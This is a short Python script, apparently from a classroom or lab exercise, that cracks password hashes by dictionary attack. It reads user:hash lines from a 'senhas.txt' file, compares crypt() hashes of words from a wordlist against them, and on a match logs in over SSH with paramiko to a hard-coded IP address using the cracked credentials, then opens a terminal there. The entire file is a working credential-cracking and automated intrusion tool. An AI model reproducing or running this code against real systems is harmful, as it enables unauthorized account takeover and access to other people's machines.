#password !/usr/bin/python
# -*- coding: utf-8 -*-
import crypt
from paramiko import *

def login(username, password):
    client = SSHClient()
    client.set_missing_host_key_policy(AutoAddPolicy())
    client.load_system_host_keys()
    try:
        client.connect('10.90.37.109', username=username, password=password)
        stdin, stdout, stderr = client.exec_command('gnome-terminal')
        print('[Success]: terminal aberto\n')
    except:
        print('[Failed]: Cannot acess this machine\n')

def testaSenha(username, dados):
    senha = dados.split('$')
    salt = '$' + senha[1] + '$' + senha[2]
    print(salt)
    dicionario = open('dicionario.txt', 'r')
    for palavra in dicionario.readlines():
        palavra = palavra.strip('\n')
        palavraCriptografada = crypt.crypt(palavra, salt)
        if palavraCriptografada == dados:
            print('[+] Encontrado a Senha: ' + palavra + '\n')
            login(username, palavra)
            return
    print('[-] Senha Não Encontrada.\n')
    return


def inicio():
    arquivoSenhas = open('senhas.txt')
    for linha in arquivoSenhas.readlines():
        if ':' in linha:
            dados = linha.split(':')
            print('[*] Quebrando senha de: ' + dados[0])
            testaSenha(dados[0], dados[1])

if __name__ == '__main__':
#     print(crypt.crypt("ifmg@2023", "$6$zAHD5VGV"))
     inicio()
#    login()
